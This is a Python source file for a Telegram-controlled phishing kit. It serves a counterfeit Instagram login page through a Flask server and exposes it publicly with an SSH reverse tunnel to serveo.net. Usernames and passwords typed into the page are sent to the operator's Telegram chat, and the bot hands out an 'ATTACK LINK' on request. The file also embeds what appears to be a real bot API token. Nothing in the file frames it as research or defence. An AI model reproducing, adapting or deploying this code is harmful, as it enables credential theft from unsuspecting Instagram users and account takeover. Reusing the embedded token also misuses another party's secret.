import telebot
from flask import Flask, request, render_template_string
import threading
import os
import subprocess
import re
import time

# --- [ CONFIG ] ---
API_TOKEN = '8666034301:AAHksgPWYvDYtNLXqsuQpq6ycVErcqnQBAA'
CH_ID = "@ZXINOXHAX"

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)
HEADER = "💜 <b>ZXINOX ELITE OS</b> 💜\n"

# --- [ WEB INTERFACE - SAME VIBE ] ---
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram • Login</title>
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #0a0a0a; border: 1px solid #7b2cbf; padding: 40px; width: 320px; border-radius: 15px; box-shadow: 0 0 40px rgba(123, 44, 191, 0.5); text-align: center; }
        .logo { font-size: 40px; font-weight: bold; margin-bottom: 5px; background: linear-gradient(to right, #7b2cbf, #9d4edd); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sub { color: #7b2cbf; font-size: 11px; letter-spacing: 2px; font-weight: bold; margin-bottom: 25px; text-transform: uppercase; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #222; background: #111; color: #fff; border-radius: 5px; box-sizing: border-box; outline: none; }
        button { width: 100%; padding: 12px; background: #7b2cbf; border: none; color: #fff; font-weight: bold; border-radius: 5px; margin-top: 15px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">Instagram</div>
        <div class="sub">Secure Authentication</div>
        <form method="post">
            <input type="text" name="u" placeholder="Username" required>
            <input type="password" name="p" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>
'''

@app.route('/<uid>', methods=['GET', 'POST'])
def index(uid):
    if request.method == 'POST':
        u, p = request.form.get('u'), request.form.get('p')
        bot.send_message(uid, f"{HEADER}👤 <b>USER:</b> <code>{u}</code>\n🔑 <b>PASS:</b> <code>{p}</code>", parse_mode='HTML')
        return render_template_string(HTML_TEMPLATE, error=True)
    return render_template_string(HTML_TEMPLATE)

# --- [ AUTO TUNNEL ENGINE ] ---
def start_tunnel(uid):
    # Serveo use kar rahe hain kyunki ye bina installation ke chalta hai
    # GSM Hosting ke terminal ki zarurat nahi, ye background mein link banayega
    ssh_cmd = "ssh -o StrictHostKeyChecking=no -R 80:localhost:10000 serveo.net"
    p = subprocess.Popen(ssh_cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in p.stdout:
        if "Forwarding HTTP traffic from" in line:
            url = line.split("from ")[1].strip()
            bot.send_message(uid, f"{HEADER}🔗 <b>ATTACK LINK:</b>\n\n<code>{url}/{uid}</code>", parse_mode='HTML')
            break

@bot.message_handler(commands=['start'])
def start(message):
    markup = telebot.types.InlineKeyboardMarkup()
    markup.add(telebot.types.InlineKeyboardButton("🚀 GET LINK", callback_data="gen"))
    bot.send_message(message.chat.id, f"{HEADER}System Online. Click to generate link.", reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == "gen")
def gen(call):
    bot.answer_callback_query(call.id, "Starting Tunnel... wait 10s.")
    threading.Thread(target=start_tunnel, args=(str(call.message.chat.id),)).start()

if __name__ == "__main__":
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=10000), daemon=True).start()
    bot.infinity_polling()
